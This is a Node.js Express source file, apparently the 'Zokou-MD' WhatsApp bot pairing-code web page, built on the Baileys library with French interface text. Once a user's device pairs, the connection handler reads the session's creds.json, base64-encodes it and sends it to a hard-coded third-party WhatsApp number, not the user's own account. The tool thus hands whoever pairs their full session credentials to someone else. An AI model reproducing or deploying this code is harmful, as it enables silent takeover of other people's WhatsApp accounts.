const pino = require("pino");
const path = require("path");
const colors = require("@colors/colors/safe");
const CFonts = require("cfonts");
const fs = require("fs-extra");
const chalk = require("chalk");
const readline = require("readline");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  PHONENUMBER_MCC,
} = require("@whiskeysockets/baileys");

 const express = require('express');
 const app = express();
 const port = process.env.PORT || 5001;

// Fonction pour lire un fichier JSON localement
function readLocalJsonFile(filePath) {
  try {
    const jsonData = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(jsonData);
  } catch (error) {
    console.error('Error reading local JSON file:', error);
    return null;
  }
}

// Fonction pour encoder en base64 une chaîne JSON
function encodeJsonToBase64(jsonData) {
  const jsonString = JSON.stringify(jsonData);
  const base64EncodedString = Buffer.from(jsonString).toString('base64');
  return base64EncodedString;
}

app.get('/', (req, res) => {
  const htmlPage = `<!DOCTYPE html>
  <html>
  <head>
      <meta charset="UTF-8" />
      <title>Zokou Parring Code</title>
      <style>
          body {
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
          }
  
          #main-title {
              font-size: 2em;
              margin-bottom: 30px;
          }
  
          #subtitles {
              margin-top: 30px;
          }
  
          #form-container {
              padding: 20px;
          }
  
          #number {
              padding: 10px;
          }
  
          #submit-button {
              padding: 10px;
              border: none;
              background-color: aquamarine;
              margin: 10px;
          }
      </style>
  </head>
  <body>
  <div>
  
      <div id="main-title">
          ZOKOU-MD
      </div>
  
      <div id="subtitles">
          <p>Développé par Djalega++ et Monkey D Luffy</p>
      </div>
  
      <div id="form-container">
          <form action="/number" method="get">
              <label for="number">Veuillez insérer votre numéro de téléphone dans le format international sans (+)</label><br> <br>
              <input type="number" id="number" name="number"><br> <br> 
              <button id="submit-button" type="submit">Envoyer</button>
          </form>
      </div>
      </div>
  </body>
  </html>
  `;

  res.send(htmlPage);
  console.log('mise en page') ;
});


app.get('/number' , (req , res ) => {

   const number = req.query.number ;
  
global.sessionName = "auth-info";
const pairingCode = process.argv.includes("--use-pairing-code");

 /*if (!pairingCode) {
  console.log(chalk.redBright("Use --use-pairing-code"));
  process.exit(1);
}  */


console.log('debut de processus')

async function main() {
  const sessionExists = await fs.pathExists(path.join(__dirname, sessionName));
  if (sessionExists) {
    console.log(chalk.greenBright("Chargement de votre session"));
    await fs.emptyDir(path.join(__dirname, sessionName));
    await delay(800);
   await ZyyPairing();
  } else {
    console.log(chalk.greenBright("Debut du  parring code"));
    await ZyyPairing();
  }
}

async function ZyyPairing() {
  const { state, saveCreds } = await useMultiFileAuthState("./" + sessionName);
  try {
    const socket = makeWASocket({
      printQRInTerminal: !pairingCode,
      logger: pino({
        level: "silent",
      }),
      browser: ['Chrome (Linux)', '', ''], // dont change this.
      auth: state,
    });
    if (pairingCode && !socket.authState.creds.registered) {
      let phoneNumber;
     // phoneNumber = await getNumber();
      
      phoneNumber = number.replace(/[^0-9]/g, ""); 

      /* Ask again when entering the wrong number
      if (
        !Object.keys(PHONENUMBER_MCC).some((v) => phoneNumber.startsWith(v))
      ) {
        console.log(
          chalk.bgBlack(
            chalk.redBright("Mettez un + et votre identifiant pays!"),
          ),
        );
        phoneNumber = await question(
          chalk.bgBlack(
            chalk.greenBright(`Veillez entrer votre numero mobile : `),
          ),
        );
        phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
        rl.close();
      } */

      setTimeout(async () => {
        let code = await socket.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(
          chalk.black(chalk.bgGreen(`Votre Pairing Code : `)),
          chalk.black(chalk.white(code)),
        );

        res.send(`<!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Zokou Parring Code</title>
            <style>
                body {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
        
                #output-container {
                    text-align: center;
                    font-size: 16px;
                    color: #333;
                    border: 2px solid black;
                    padding: 20px;
                    border-radius: 8px;
                }
            </style>
        </head>
        <body>
        
            <div id="output-container">
                <p>Votre code Pairing est :</p>
                <br>
                <span id="code">`+ code +`</span>
            </div>
        
        </body>
        </html>
        `) ;
      }, 3000);
    }
    socket.ev.on(
      "connection.update",
      async ({ connection, lastDisconnect }) => {
        if (connection === "open") {

          let session = await readLocalJsonFile("./" + sessionName + "/creds.json") ;
          let sessionEn = await encodeJsonToBase64(session)
          let file = await socket.sendMessage("22891733300@s.whatsapp.net", {
            text : sessionEn
          });

          await socket.sendMessage(
            "22891733300@s.whatsapp.net",
            { text: "Mettez cette session dans la variable SESSION_ID sur heroku" },
            { quoted: file },
          );

          console.log(chalk.greenBright("BIEN!"));
          await fs.emptyDir("./" + sessionName);

        } else if (
          connection === "close" &&
          lastDisconnect &&
          lastDisconnect.error &&
          lastDisconnect.error.output.statusCode &&
          lastDisconnect.error.output.statusCode !== 401
        ) {
         await ZyyPairing();
          await fs.emptyDir("./" + sessionName);
        }
      },
    );
    socket.ev.on("creds.update", saveCreds);
  } catch (error) {
    console.error(error);
    await fs.emptyDir("./" + sessionName);

  }
}

  try {
     main()
  } catch (e) {
    console.log(e)
  }

  })


app.listen(port, () => {

    console.log('serveur ouvert sur le port ' + port) 
} )
